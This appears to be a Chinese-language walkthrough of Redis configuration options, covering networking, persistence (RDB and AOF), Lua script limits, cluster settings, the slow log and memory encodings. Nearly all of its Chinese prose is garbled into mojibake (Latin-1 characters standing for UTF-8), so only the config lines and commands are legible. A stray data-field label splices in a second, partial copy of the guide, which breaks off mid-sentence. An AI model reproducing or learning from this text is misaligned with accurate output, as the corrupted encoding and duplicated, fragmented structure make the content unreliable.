æ­¤åè½å½åä¸èµ·ä½ç¨ã\n\n\n# kernel oom control åæ ¸ oom æ§å¶\n\nè¿ä¸ª oom-score-adj åæ°æ¯ç¨æ¥ Linux åæ ¸æ§å¶è°ä¼çï¼å¨ Linux ç³»ç»ä¸­ï¼å½åå­æº¢åºæ¶ï¼å¯ä»¥æç¤ºåæ ¸ OOM killer åºè¯¥é¦åææ­»åªäºè¿ç¨ã\n\noom-score-adj no\n\n\n1\n\n\nå¯ç¨æ­¤åè½å¯ä½¿ Redis æ ¹æ®å¶è¿ç¨ä¸»å¨æ§å¶å¶ææè¿ç¨ç oom_score_adj å¼ãé»è®¤åæ°å°å°è¯ä½¿åå°å­è¿ç¨å¨ææå¶ä»è¿ç¨ä¹åè¢«ææ­»ï¼è replicas å¨ä¸»æ°æ®åºä¹åè¢«ææ­»ã\n\noom-score-adj-values 0 200 800\n\n\n1\n\n\né»è®¤ oom-score-adj-values ä¸è®¾ç½®çæåµä¸ä¼ä¼åææ­»åå°å­è¿ç¨ï¼ç¶åä¸»ä»èç¹ä¼åä¼åææ­»ä»èç¹ã\n\næä»¥è¿ 3 ä¸ªå¼åå«ç¨æ¥è®¾ç½®ä¸»ãä»ãåå°å­è¿ç¨çåå¼çï¼åå¼èå´ä» -1000 ~ 1000ï¼åå¼è¶é«è¶æå¯è½è¢«åææ­»ã\n\n\n# append only mode AOF è¿½å æ¨¡å¼\n\nRedis å¯ä»¥å®ç°æ°æ®çæä¹åå­å¨ï¼å³å°æ°æ®ä¿å­å°ç£çä¸ã\nRedis çæä¹åå­å¨æä¾ä¸¤ç§æ¹å¼ï¼RDB ä¸ AOFãRDB æ¯é»è®¤éç½®ãAOF éè¦æå¨å¼å¯ã\nç°å¨ Redis çéç½®ä¸­é»è®¤æ¯å³é­ AOF æ¨¡å¼çã\n\n\n# appendonly\n\nappendonly no\n\n\n1\n\n\næ¯å¦å¼å¯ AOF\n\n\n# appendfilename\n\nappendfilename "appendonly.aof"\n\n\n1\n\n\nä¿å­æ°æ®ç AOF æä»¶åç§°\n\n\n# appendfsync\n\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n\n1\n2\n3\n\n\nRedis æ¯æ 3 ç§ä¸åçæ¨¡å¼ï¼\n\n * noï¼ä¸å³æ¶åæ­¥ï¼ç±æä½ç³»ç»æ§å¶ä½æ¶å·åå°ç£çä¸ï¼è¿ç§æ¨¡å¼éåº¦æå¿«ï¼\n * alwaysï¼æ¯æ¬¡åªåæ¥å¿ï¼éåº¦è¾æ¢ï¼ä½æå®å¨ï¼\n * everysecï¼æ¯ç§éåæ­¥ä¸æ¬¡ï¼æä¸­çæ¹æ¡ã\n\n\n# no-appendfsync-on-rewrite\n\nno-appendfsync-on-rewrite no\n\n\n1\n\n\nå½ä½¿ç¨ AOF ç appendfsync è®¾ç½®ä¸º always æ everysec æ¶ï¼åå°çå­å¨è¿ç¨ä¼æ§è¡å¤§éçç£ç I/O æä½ï¼å¨ä¸äº Linux æ¶æä¸­ï¼Redis fsync () è°ç¨æ¶å¯è½ä¼é»å¡å¾ä¹ãè¿ä¸ªé®é¢å½åå¹¶æ²¡æä¿®å¤ï¼å³ä½¿æ¯å¨ä¸ä¸ªä¸åççº¿ç¨æ§è¡ fsync ä¹ä¼é»å¡æä»¬çåæ­¥åè°ç¨ã\n\nä¸ºäºç¼è§£è¿ä¸ªé®é¢ï¼å¯ä»¥ä½¿ç¨ä»¥ä¸éé¡¹ï¼å®å°ä¼å¨æä¸ä¸ª BGSAVE æ BGREWRITEAOF æ­£å¨è¿è¡æ¶ï¼é»æ­¢ä¸»è¿ç¨è°ç¨ fsync ()ã\n\nè¿æå³çæå¦ä¸ä¸ªå­è¿ç¨å¨å­å¨æ¶ï¼Redis çæä¹æ§ç­åäº appendfsync noãå¨å®è·µä¸­ï¼æå³çå¨æåçæåµä¸å®å¯è½ä¸¢å¤±å¤è¾¾ 30 ç§çæ¥å¿ï¼é»è®¤ç Linux è®¾ç½®ï¼ã\n\nå¦æä½ ææ½å¨çé®é¢éè¦æ´æ¹å®ä¸º âyesâãå¦åä»æä¹æ§çè§ç¹æ¥ç ânoâ æ¯æå®å¨çéæ©ã\n\n\n# auto-aof-rewrite-percentage auto-aof-rewrite-min-size\n\nauto-aof-rewrite-percentage 100\n\n\n1\n\n\naof æä»¶å¢é¿æ¯ä¾ï¼æå½å aof æä»¶æ¯ä¸æ¬¡éåçå¢é¿æ¯ä¾å¤§å°ãaof éåå³å¨ aof æä»¶å¨ä¸å®å¤§å°ä¹åï¼éæ°å°æ´ä¸ªåå­åå° aof æä»¶å½ä¸­ï¼ä»¥åæ ææ°çç¶æ (ç¸å½äº bgsave)ãè¿æ ·å°±é¿åäºï¼aof æä»¶è¿å¤§èå®éåå­æ°æ®å°çé®é¢ (é¢ç¹ä¿®æ¹æ°æ®é®é¢).\n\n\n# auto-aof-rewrite-min-size\n\nauto-aof-rewrite-min-size 64mb\n\n\n1\n\n\naof æä»¶éåæå°çæä»¶å¤§å°ï¼å³æå¼å§ aof æä»¶å¿é¡»è¦è¾¾å°è¿ä¸ªæä»¶æ¶æè§¦åï¼åé¢çæ¯æ¬¡éåå°±ä¸ä¼æ ¹æ®è¿ä¸ªåéäº (æ ¹æ®ä¸ä¸æ¬¡éåå®æä¹åçå¤§å°). æ­¤åéä»åå§åå¯å¨ redis ææãå¦ææ¯ redis æ¢å¤æ¶ï¼å lastSize ç­äºåå§ aof æä»¶å¤§å°ã\n\n# rewrite æºå¶\n\nå¶å® Redis oaf æºå¶åæ¬äºä¸¤ä»¶äºï¼rewrite å AOFãrewrite ç±»ä¼¼äºæ®éæ°æ®åºç®¡çç³»ç»æ¥å¿æ¢å¤ç¹ï¼å½ AOF æä»¶éçåå½ä»¤çè¿è¡è¨èæ¶ï¼å½æä»¶å¤§å°è§¦ç¢°å°ä¸´çæ¶ï¼rewrite ä¼è¢«è¿è¡ã\n\nrewrite ä¼åå¤å¶ä¸æ ·ï¼fork åºä¸ä¸ªå­è¿ç¨ï¼åå»ºä¸ä¸ªä¸´æ¶æä»¶ï¼éåæ°æ®åºï¼å°æ¯ä¸ª keyãvalue å¯¹è¾åºå°ä¸´æ¶æä»¶ãè¾åºæ ¼å¼å°±æ¯ Redis çå½ä»¤ï¼ä½æ¯ä¸ºäºåå°æä»¶å¤§å°ï¼ä¼å°å¤ä¸ª keyãvalue å¯¹éåæ´çç¨ä¸æ¡å½ä»¤è¡¨è¾¾ãå¨ rewrite æé´çåæä½ä¼ä¿å­å¨åå­ç rewrite buffer ä¸­ï¼rewrite æååè¿äºæä½ä¹ä¼å¤å¶å°ä¸´æ¶æä»¶ä¸­ï¼å¨æåä¸´æ¶æä»¶ä¼ä»£æ¿ AOF æä»¶ã\n\nç®åæ¥è¯´ï¼aof éå­æ¾äºææç redis æä½æä»¤ï¼å½ aof æä»¶è¾¾å°ä¸å®æ¡ä»¶æèæå¨ bgrewriteaof å½ä»¤é½å¯ä»¥è§¦å rewriteãrewrite ä¹å aof æä»¶ä¼ä¿å­ keys çæåçç¶æï¼æ¸é¤æä¹ååä½çï¼æ¥ç¼©å°è¿ä¸ªæä»¶ãè¿éæè°çç¼©å°å°±æ¯ æ´çæä»¤ ï¼æ¯å¦å®¢æ·ç«¯åéè¿ä¸ä¸ªå½ä»¤ï¼\n\nlpush key 1 2 3\n# ç§»åºå·¦è¾¹ç¬¬ä¸ä¸ªåç´ ï¼ä¹å°±æ¯æä¸é¢çåç´  1 ç§»åº\nlpop key \nlpush key 4 5 6\n\n\n1\n2\n3\n4\n\n\næ´çåçæä»¤æä»¶æ¯\n\nlpush key 4 5 6 2 3\n\n\n1\n\n\n\n# aof-load-truncated\n\naof-load-truncated yes\n\n\n1\n\n\næ redis å¨æ¢å¤æ¶ï¼ä¼å¿½ç¥æåä¸æ¡å¯è½å­å¨é®é¢çæä»¤ãé»è®¤å¼ yesãå³å¨ aof åå¥æ¶ï¼å¯è½å­å¨æä»¤åéçé®é¢ (çªç¶æ­çµï¼åäºä¸å)ï¼è¿ç§æåµä¸ï¼yes ä¼ log å¹¶ç»§ç»­ï¼è no ä¼ç´æ¥æ¢å¤å¤±è´¥.\n\n\n# aof-use-rdb-preamble\n\naof-use-rdb-preamble yes\n\n\n1\n\n\næ··åæä¹ååæ ·ä¹æ¯éè¿ bgrewriteaof å®æçï¼ä¸åçæ¯å½å¼å¯æ··åæä¹åæ¶ï¼fork åºçå­è¿ç¨åå°å±äº«çåå­å¯æ¬å¨éçä»¥ RDB æ¹å¼åå¥ aof æä»¶ï¼ç¶åå¨å°éåç¼å²åºçå¢éå½ä»¤ä»¥ AOF æ¹å¼åå¥å°æä»¶ï¼åå¥å®æåéç¥ä¸»è¿ç¨æ´æ°ç»è®¡ä¿¡æ¯ï¼å¹¶å°æ°çå«æ RDB æ ¼å¼å AOF æ ¼å¼ç AOF æä»¶æ¿æ¢æ§çç AOF æä»¶ãç®åçè¯´ï¼æ°ç AOF æä»¶ååæ®µæ¯ RDB æ ¼å¼çå¨éæ°æ®ååæ®µæ¯ AOF æ ¼å¼çå¢éæ°æ®ã\n\n\n# lua scripting lua èæ¬\n\nRedis æä¾äº Lua èæ¬åè½æ¥è®©ç¨æ·å®ç°èªå·±çåå­å½ä»¤ï¼ä½ä¹å­å¨çé£é©ï¼ç¼åä¸å½çèæ¬å¯è½é»å¡çº¿ç¨å¯¼è´æ´ä¸ª Redis æå¡ä¸å¯ç¨ã\n\nlua-time-limit 5000\n\n\n1\n\n\nRedis çéç½®æä»¶ä¸­æä¾äºå¦ä¸éç½®é¡¹æ¥è§å®æå¤§æ§è¡æ¶é¿ã\n\nä½è¿éæä¸ªåï¼å½ä¸ä¸ªèæ¬è¾¾å°æå¤§æ§è¡æ¶é¿çæ¶åï¼Redis å¹¶ä¸ä¼å¼ºå¶åæ­¢èæ¬çè¿è¡ï¼ä»ä»å¨æ¥å¿éæå°ä¸ªè­¦åï¼åç¥æèæ¬è¶æ¶ã\n\nå ä¸º Redis å¿é¡»ä¿è¯èæ¬æ§è¡çåå­æ§ï¼ä¸­éåæ­¢å¯è½å¯¼è´åå­çæ°æ®éä¸åªä¿®æ¹äºé¨åæ°æ®ã\n\nå¦ææ¶é¿è¾¾å° Lua-time-limit è§å®çæå¤§æ§è¡æ¶é´ï¼Redis åªä¼åè¿å ä»¶äºæï¼\n\n * æ¥å¿è®°å½æèæ¬è¿è¡è¶æ¶\n * å¼å§åè®¸æ¥åå¶ä»å®¢æ·ç«¯è¯·æ±ï¼ä½ä»éäº SCRIPT KILL å SHUTDOWN NOSAVE ä¸¤ä¸ªå½ä»¤\n * å¶ä»è¯·æ±ä»è¿å busy éè¯¯\n\n\n# - cluster éç¾¤\n\ncluster-enabled yes\n\n\n1\n\n\nå¼å¯éç¾¤æ¨¡å¼\n\ncluster-config-file nodes-6379.conf\n\n\n1\n\n\n1ãè¿ä¸ªéç½®æä»¶ä¸æ¯è¦æä»¬å»éçï¼èæ¯ Redis è¿è¡æ¶ä¿å­éç½®çæä»¶ï¼æä»¥æä»¬ä¹ä¸å¯ä»¥ä¿®æ¹è¿ä¸ªæä»¶ã\n\n2ãRedis éç¾¤èç¹æ¯æ¬¡åçæ´æ¹æ¶èªå¨ä¿çéç¾¤éç½®ï¼åºæ¬ä¸ä¸ºç¶æï¼çæä»¶ï¼ä»¥ä¾¿è½å¤ å¨å¯å¨æ¶éæ°è¯»åå®ã\n\n3ãè¯¥æä»¶ååºäºéç¾¤ä¸­å¶ä»èç¹ï¼å®ä»¬çç¶æï¼æä¹åéç­ç­ä¿¡æ¯ã ç±äºæäºæ¶æ¯çæ¥æ¶ï¼éå¸¸ä¼å°æ­¤æä»¶éåå¹¶å·æ°å°ç£çä¸ã\n\n4ãçæçæä»¶å¨ dir æå®è·¯å¾ä¸\n\ncluster-node-timeout 15000\n\n\n1\n\n\nè¶æ¶æ¶é´æ¯éç¾¤ä¸­åèç¹ç¸äºéè®¯æ¶ï¼åè®¸ "å¤±è" çæå¤§æ¯«ç§æ°ï¼ä¸é¢çéç½®ä¸º 15 ç§ï¼å¦æè¶è¿ 15 ç§æä¸ªèç¹æ²¡åå¶å®èç¹æ±æ¥æåï¼è®¤ä¸ºè¯¥èç¹æäºã\n\ncluster-replica-validity-factor 10\n\n\n1\n\n\n1ãå¦æè®¾ç½®ä¸º 0ï¼æ è®ºä¸»èç¹åä»èç¹ä¹é´çé¾è·¯æ­å¼è¿æ¥çæ¶é´é¿ç­ï¼ä»èç¹é½å°å°è¯æéåæ¢ä¸ºä¸»èç¹ã\n\n2ã å¦æè¯¥å¼ä¸ºæ­£å¼ï¼åè®¡ç®æå¤§æ­å¼æ¶é´ä½ä¸ºèç¹è¶æ¶å¼ä¹ä»¥æ­¤éé¡¹æä¾çç³»æ°ï¼å¦æè¯¥èç¹æ¯ä»èç¹ï¼åå¨ä¸»é¾è·¯æ­å¼è¿æ¥çæ¶é´è¶è¿æå®çè¶æ¶å¼æ¶ï¼å®ä¸ä¼å°è¯å¯å¨æéåæ¢ã ä¾å¦ï¼å¦æèç¹è¶æ¶è®¾ç½®ä¸º 5 ç§ï¼å¹¶ä¸ææå å­è®¾ç½®ä¸º 10ï¼åä¸ä¸»èç¹æ­å¼è¿æ¥è¶è¿ 50 ç§çä»èç¹å°ä¸ä¼å°è¯å¯¹å¶ä¸»èç¹è¿è¡æéåæ¢ã\n\n3ãè¯·æ³¨æï¼å¦ææ²¡æä»æå¡å¨èç¹è½å¤å¯¹å¶è¿è¡æéè½¬ç§»ï¼åä»»ä½éé¶å¼é½å¯è½å¯¼è´ Redis éç¾¤å¨ä¸»æå¡å¨åºç°æéåä¸å¯ç¨ã å¨è¿ç§æåµä¸ï¼åªæåå§ä¸»èç¹éæ°å å¥éç¾¤æ¶ï¼éç¾¤æä¼è¿åå¯ç¨ã\n\ncluster-migration-barrier 1\n\n\n1\n\n\nä¸»èç¹å°ä¿æè¿æ¥çæå°ä»èç¹æ°éï¼ä»¥ä¾¿å¦ä¸ä¸ªä»èç¹è¿ç§»å°ä¸åä»»ä½ä»èç¹è¦ççä¸»èç¹ã\n\ncluster-require-full-coverage yes\n\n\n1\n\n\nå½ cluster-require-full-coverage ä¸º no æ¶ï¼è¡¨ç¤ºå½è´è´£ä¸ä¸ªææ§½çä¸»åºä¸çº¿ä¸æ²¡æç¸åºçä»åºè¿è¡æéæ¢å¤æ¶ï¼éç¾¤ä»ç¶å¯ç¨ã\n\nå½ cluster-require-full-coverage ä¸º yes æ¶ï¼è¡¨ç¤ºå½è´è´£ä¸ä¸ªææ§½çä¸»åºä¸çº¿ä¸æ²¡æç¸åºçä»åºè¿è¡æéæ¢å¤æ¶ï¼éç¾¤ä¸å¯ç¨ã\n\ncluster-replica-no-failover no\n\n\n1\n\n\nè®¾ç½®ä¸º yes æ¶ï¼æ­¤éé¡¹å¯é²æ­¢ä»æå¡å¨å¨ä¸»æå¡å¨æéæé´å°è¯å¯¹ä¸»æå¡å¨è¿è¡æéè½¬ç§»ãä½æ¯ï¼ä¸»æå¡å¨ä»ç¶å¯ä»¥æ§è¡æå¨æéè½¬ç§»ï¼å¦æè¢«è¿«æ§è¡ï¼ã\n\ncluster-allow-reads-when-down no\n\n\n1\n\n\né»è®¤ä¸º no, è¡¨ç¤ºå½éç¾¤å ä¸»èç¹æ°éè¾¾ä¸å°æå°å¼æææ£åæ§½æ²¡æåéèè¢«æ è®°ä¸ºå¤±ææ¶ï¼èç¹å°åæ­¢ææçå®¢æ·ç«¯éè®¯ã è¿æ ·å¯ä»¥é¿åä»ä¸ä¸ªä¸ç¥ééç¾¤ç¶æååçèç¹è¯»å°ä¸ä¸è´æ°æ®çå±é©ã è®¾ä¸º yes ååè®¸éç¾¤å¤±ææ¶ä»å¯ä»¥ç±èç¹ä¸­è¯»åæ°æ®ã è¿æ ·æ¢ä¿è¯è¯»æä½çé«å¯ç¨æ§ï¼ ä¹é¿åä¸ä¸è´åæä½ï¼åæ¶å½ Redis Cluster ä»åå« 1 è³ 2 ä¸ªèç¹ï¼èæä¸ªèç¹å¤±æåæ å¯ç¨ä»èç¹æ¿ä»£ï¼ä¸å èç¹æ°éä¸è¶³ï¼æ æ³èªå¨éæ°åéæ£åæ§½ï¼åè¯¥åæ°è®¾ä¸º yes å¯ä¿è¯èç¹ä»ç¶å¯æ§è¡è¯»æä½ã\n\n\n# slow log æ¢æ¥å¿\n\nslowlog-log-slower-than 1000\n\n\n1\n\n\nå¶ä¸­ slowlog-log-slower-than è¡¨ç¤º slowlog çåå®çéï¼åªæ query æ§è¡æ¶é´å¤§äº slowlog-log-slower-than çæä¼å®ä¹ææ¢æ¥è¯¢ï¼æä¼è¢« slowlog è¿è¡è®°å½ãslowlog-log-slower-than è®¾ç½®çåä½æ¯å¾®å¦ï¼é»è®¤æ¯ 10000 å¾®å¦ï¼ä¹å°±æ¯ 10ms\n\nslowlog-max-len 128\n\n\n1\n\n\nslowlog-max-len è¡¨ç¤ºæ¢æ¥è¯¢æå¤§çæ¡æ°ï¼å½ slowlog è¶è¿è®¾å®çæå¤§å¼åï¼ä¼å°ææ©ç slowlog å é¤ï¼æ¯ä¸ª FIFO éå\n\n\n# latency monitor å»¶è¿çè§å¨\n\nlatency-monitor-threshold 0\n\n\n1\n\n\nredis å»¶æ¶çæ§ç³»ç»å¨è¿è¡æ¶ä¼éæ ·ä¸äºæä½ï¼ä»¥ä¾¿æ¶éå¯è½å¯¼è´å»¶æ¶çæ°æ®æ ¹æºã\néè¿ LATENCY å½ä»¤ å¯ä»¥æå°ä¸äºå¾æ ·åè·åä¸äºæ¥åï¼æ¹ä¾¿çæ§\nè¿ä¸ªç³»ç»ä»ä»è®°å½é£ä¸ªæ§è¡æ¶é´å¤§äºæç­äºé¢å®æ¶é´ï¼æ¯«ç§ï¼çæä½ï¼\nè¿ä¸ªé¢å®æ¶é´æ¯éè¿ latency-monitor-threshold éç½®æ¥æå®çï¼\nå½è®¾ç½®ä¸º 0 æ¶ï¼è¿ä¸ªçæ§ç³»ç»å¤äºåæ­¢ç¶æ\n\n\n# event notification äºä»¶éç¥\n\nnotify-keyspace-events ""\n\n\n1\n\n\n\n# advanced config é«çº§éç½®\n\nå½åå¸æ¡ç®åªæå°éæ¡ç®ä¸æå¤§æ¡ç®æªè¶è¿ç»å®éå¼æ¶ï¼å°ä½¿ç¨åå­é«æçæ°æ®ç»æå¯¹å¶è¿è¡ç¼ç \n\nhash-max-ziplist-entries 512\n\n\n1\n\n\næ°æ®éå°äºç­äº hash-max-ziplist-entries çç¨ ziplistï¼å¤§äº hash-max-ziplist-entries ç¨ hash\n\nhash-max-ziplist-value 64\n\n\n1\n\n\nvalue å¤§å°å°äºç­äº hash-max-ziplist-value çç¨ ziplistï¼å¤§äº hash-max-ziplist-value ç¨ hashã',normalizedContent:'> + é»è®¤éç½®æå¼ï¼- é»è®¤éç½®å³é­\n\n\n# network ç½ç»\n\n\n# + bind\n\n# ç»å®ip\nbind 127.0.0.1\n\n\n1\n2\n\n\né»è®¤æ¯ 127.0.0.1ï¼ä¿®æ¹ç ip å¦æä¸ä¸ºæ¬æº ip æ¯æ æ³å¯å¨çãå¯ä»¥ç´æ¥æ³¨é bindï¼è¿æ ·æææºå¨å¯è¿ï¼ä½ä¼å protected-mode åæ°å½±åã\n\n\n# + protected-mode\n\n# åä¿æ¤ç é»è®¤å¼å¯\nprotected-mode yes\n\n\n1\n2\n\n\nä¿æ¤æ¨¡å¼ä¸ï¼æ è®º bind æ¯å¦è¢«æ³¨éé½æ æ³è¿ç¨è®¿é®ãæ³åè®¸å¤ç½æå±åç½è®¿é®éè¦å³é­ä¿æ¤æ¨¡å¼ï¼ä¸æ³¨é bindã\n\n\n# + port\n\n### ç«¯å£é»è®¤\nport 6379\n\n\n1\n2\n\n\n\n# + tcp-backlog\n\ntcp-backlog 511\n\n\n1\n\n\nlinux åæ ¸ä¸ºæ¯ä¸ª tcp æå¡å¨ç¨åºç»´æ¤ä¸¤æ¡ backlog éåï¼ä¸æ¡æ¯ tcp å±çæªè¿æ¥éåï¼ä¸æ¡æ¯åºç¨å±çå·²è¿æ¥éåï¼åå«å¯¹åº net.ipv4.tcp_max_syn_backlog å net.core.somaxconn ä¸¤ä¸ªåæ ¸åæ°ã\n\nä¸ä¸ªå®¢æ·ç«¯è¿æ¥å¨å®æ tcp 3 æ¬¡æ¡æä¹åé¦åè¿å¥å°æªè¿æ¥éåï¼å®ææ¡æä¹åæ­£å¼å»ºç«è¿æ¥ï¼è¿å¥å·²è¿æ¥éåï¼äº¤ä»ç»åºç¨ç¨åºå¤çãåºç¨ç¨åºè°ç¨ accept () å½æ°ä»å·²è¿æ¥éåååºè¿æ¥è¿è¡å¤çãåºç¨å±å¨è°ç¨ listen () å½æ°æ¶æå®ç backlog æ¯å·²è¿æ¥éåå¤§å°ï¼å¦æå¤§äº somaxconn å°è¢«è®¾ä¸º somaxconnã\n\nå¦æåºç¨å±ä¸è°ç¨ accept () å½æ°å¤çä¸ä¸ªè¿æ¥ï¼æèå¤çä¸åæ¶çè¯ï¼å°ä¼å¯¼è´å·²è¿æ¥éåå æ»¡ãå·²è¿æ¥éåå·²æ»¡çè¯ä¼å¯¼è´æªè¿æ¥éåå¨å¤çå® 3 æ¬¡æ¡æä¹åæ æ³è¿å¥å·²è¿æ¥éåï¼æç»ä¹å¯¼è´æªè¿æ¥éåå æ»¡ï¼å¨æå¡å¨çå°å¤äºæªè¿æ¥éåä¸­çè¿æ¥ç¶æä¸º syn_recvã æ°è¿æ¥çå®¢æ·ç«¯è¿æ¥å°ä¼ä¸ç´å¤äº syn_sent ç¶æç­å¾æå¡å¨ç ack åºç­ï¼æç»å¯¼è´è¿æ¥è¶æ¶ã\n\n# æ¥çéåå¤§å°\n\næ¥çæªè¿æ¥éåé»è®¤å¼ï¼\n\ncat /proc/sys/net/ipv4/tcp_max_syn_backlog\n\n\n1\n\n\næ¥çå·²è¿æ¥éåé»è®¤å¼ï¼\n\ncat /proc/sys/net/core/somaxconn\n\n\n1\n\n\n# ä¿®æ¹éåå¤§å°\n\nå¯ä»¥ç´æ¥æ¹åè¿ä¸¤ä¸ªæä»¶çå¼ãè¦æ°¸ä¹ä¿®æ¹è¿ä¸¤ä¸ªåæ ¸åæ°çè¯å¯ä»¥åå° /etc/sysctl.conf\n\nnet.ipv4.tcp_max_syn_backlog = 1024\nnet.core.somaxconn = 1024\n\n\n1\n2\n\n\næ¹å®åæ§è¡ sysctl -p è®©ä¿®æ¹ç«å³çæã\n\n\n# timeout\n\ntimeout 0\n\n\n1\n\n\nå®¢æ·ç«¯é²ç½® n ç§åå³é­è¿æ¥ï¼0 ç¦ç¨ï¼\n\n\n# tcp-keepalive\n\ntcp-keepalive 300\n\n\n1\n\n\nåå®¢æ·ç«¯åé tcp ack æ£æµè¿æ¥æ¯å¦æ­å¼ï¼ä¿è¯è¿æ¥æ´»è·ãåä½ç§ï¼é»è®¤ 300 ç§åéä¸æ¬¡ï¼å¦æç­äº 0 å°±æ¯ç¦ç¨ã\n\n\n# general ä¸è¬\n\n\n# daemonize\n\ndaemonize no\n\n\n1\n\n\né»è®¤æåµä¸ï¼redis ä¸ä¼ä½ä¸ºå®æ¤ç¨åºè¿è¡ãå¦æéè¦ï¼è¯·è®¾ç½®ä¸º yesãè¯·æ³¨æï¼redis å®æ¤è¿ç¨å°å¨ /var/run/redis.pid ä¸­åå¥ä¸ä¸ª pid æä»¶ã\n\n\n# supervised\n\nsupervised no\n\n\n1\n\n\nå¦æéè¦å¨æºå¨å¯å¨ï¼upstart æ¨¡å¼ æ systemd æ¨¡å¼ï¼æ¶å°±å¯å¨ redis æå¡å¨ï¼å¯ä»¥éè¿è¯¥éé¡¹æ¥éç½® redisã\n\n * supervised no - ä¸ä¼ä¸ supervised tree è¿è¡äº¤äº\n * supervised upstart - å° redis æå¡å¨æ·»å å° sigstop æ¨¡å¼ä¸­\n * supervised systemd - å° ready=1 åå¥ $notify_socket\n * supervised auto - æ ¹æ®ç¯å¢åé upstart_job æ notify_socket æ£æµ upstart è¿æ¯ systemd\n\nä¸è¿° supervision æ¹æ³ï¼upstart æ systemdï¼ä»ååº âç¨åºå·²å°±ç»ªâ ä¿¡å·ï¼ä¸ä¼ç»§ç»­ç» supervisor è¿å ping åå¤ã\n\n\n# pidfile\n\npidfile /var/run/redis_6379.pid\n\n\n1\n\n\nå½ redis æå¡å¨å·²å®æ¤è¿ç¨å¯å¨æ¶ï¼å¦ææå®äºéç½®æä»¶ï¼åç´æ¥ä½¿ç¨ï¼å¦ææ²¡ææå®ï¼ååå»º /var/run/redis.pid ä½ä¸ºéç½®æä»¶ã\n\n\n# loglevel\n\nloglevel notice\n\n\n1\n\n\næå®æå¡å¨ç verbosity çº§å«ãredis æä¾åç§çº§å«ï¼\n\n * debug åå«å¤§éä¿¡æ¯ï¼ç¨äºå¼ååæµè¯\n * verbose åå«ä¸äºç¨æçæç¨ä¿¡æ¯ï¼ä½æ²¡æ debug çº§å«æ··ä¹±\n * notice ééæç¤ºä¿¡æ¯ï¼ç¨äºçäº§ç¯å¢\n * warning åªåå«éå¸¸éè¦åå³é®çä¿¡æ¯\n\n\n# logfile\n\nlogfile ""\n\n\n1\n\n\næå®æ¥å¿æä»¶åç§°ãæå®ä¸ºç©ºæ¶å°è¾åºå°æ åè¾åºè®¾å¤ä¸­ãå¦æ redis ä»¥å®æ¤è¿ç¨å¯å¨ï¼å½æ¥å¿æä»¶åç§°ä¸ºç©ºæ¶ï¼æ¥å¿å°ä¼è¾åºå° /dev/nullã\n\n\n# databases\n\ndatabases 16\n\n\n1\n\n\nè®¾ç½®æ°æ®åºçæ°éãé»è®¤ä½¿ç¨ 0 å·æ°æ®åºãå¯ä»¥å¨æ¯ä¸ä¸ªè¿æ¥ä¸ä½¿ç¨ select <dbid> æ¥æå®å¦å¤çæ°æ®åºï¼ä½æ¯è¿ä¸ªå¼å¿é¡»å¨ 0 å° database -1 ä¹é´ã\n\n\n# always-show-logo\n\nalways-show-logo yes\n\n\n1\n\n\nredis å¯å¨çæ¶åæ¾ç¤º æ¥å¿ã\n\n\n# snapshotting å¿«ç§\n\n\n# save\n\nsave 900 1\nsave 300 10\nsave 60 10000\n\n\n1\n2\n3\n\n\nè¿äº 900 ç§å¹¶ä¸æ 1 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\nè¿äº 300 ç§å¹¶ä¸æ 10 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\nè¿äº 60 ç§å¹¶ä¸è³å°æ 10000 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\n\n\n# stop-writes-on-bgsave-error\n\nstop-writes-on-bgsave-error yes\n\n\n1\n\n\né»è®¤å¼ä¸º yesãå½å¯ç¨äº rdb ä¸æåä¸æ¬¡åå°ä¿å­æ°æ®å¤±è´¥ï¼redis æ¯å¦åæ­¢æ¥æ¶æ°æ®ãè¿ä¼è®©ç¨æ·æè¯å°æ°æ®æ²¡ææ­£ç¡®æä¹åå°ç£çä¸ï¼å¦åæ²¡æäººä¼æ³¨æå°ç¾é¾ï¼disasterï¼åçäºãå¦æ redis éå¯äºï¼é£ä¹åå¯ä»¥éæ°å¼å§æ¥æ¶æ°æ®äº\n\n\n# rdbcompression\n\nrdbcompression yes\n\n\n1\n\n\né»è®¤å¼æ¯ yesãå¯¹äºå­å¨å°ç£çä¸­çå¿«ç§ï¼å¯ä»¥è®¾ç½®æ¯å¦è¿è¡åç¼©å­å¨ãå¦ææ¯çè¯ï¼redis ä¼éç¨ lzf ç®æ³è¿è¡åç¼©ãå¦æä½ ä¸æ³æ¶è cpu æ¥è¿è¡åç¼©çè¯ï¼å¯ä»¥è®¾ç½®ä¸ºå³é­æ­¤åè½ï¼ä½æ¯å­å¨å¨ç£çä¸çå¿«ç§ä¼æ¯è¾å¤§ã\n\n\n# rdbchecksum\n\nrdbchecksum yes\n\n\n1\n\n\nå¨å­å¨å¿«ç§åï¼æä»¬è¿å¯ä»¥è®© redis ä½¿ç¨ crc64 ç®æ³æ¥è¿è¡æ°æ®æ ¡éªï¼ä½æ¯è¿æ ·åä¼å¢å å¤§çº¦ 10% çæ§è½æ¶èï¼å¦æå¸æè·åå°æå¤§çæ§è½æåï¼å¯ä»¥å³é­æ­¤åè½ã\n\n\n# dbfilename\n\ndbfilename dump.rdb\n\n\n1\n\n\nrdb æä»¶å¾æä»¶åç§°\n\n\n# rdb-del-sync-files\n\nrdb-del-sync-files no\n\n\n1\n\n\nrdb æä»¶æ¯å¦å é¤åæ­¥é\n\ndir ./\n\n\n1\n\n\nè®¾ç½® rdb æä»¶å­æ¾å¾è·¯å¾\n\n\n# åå»º rdb æä»¶æºå¶\n\nfork åºä¸ä¸ªå­è¿ç¨æ¥å¤çï¼å®åç¶è¿ç¨å±äº«åå­éé¢çä»£ç æ®µåæ°æ®æ®µãè¿æ¶ä½ å¯ä»¥æç¶å­è¿ç¨æ³è±¡æä¸ä¸ªè¿ä½å©´å¿ï¼ä»ä»¬å¨å±äº«èº«ä½ãè¿å°±æ¯ linux æä½ç³»ç»çæºå¶ï¼ä¸ºäºèçº¦åå­èµæºï¼æä»¥å°½å¯è½è®©ä»ä»¬å±äº«èµ·æ¥ãå¨è¿ç¨åç¦»çä¸ç¬é´ï¼åå­çå¢é¿å ä¹æ²¡æææ¾ååã\n\nå­è¿ç¨åæ°æ®æä¹åï¼ä¸ä¼ä¿®æ¹ç°æçåå­æ°æ®ç»æï¼å®åªæ¯å¯¹æ°æ®ç»æè¿è¡éåè¯»åï¼ç¶ååºååå°ç£çä¸­ãä½æ¯ç¶è¿ç¨ä¸ä¸æ ·ï¼å®å¿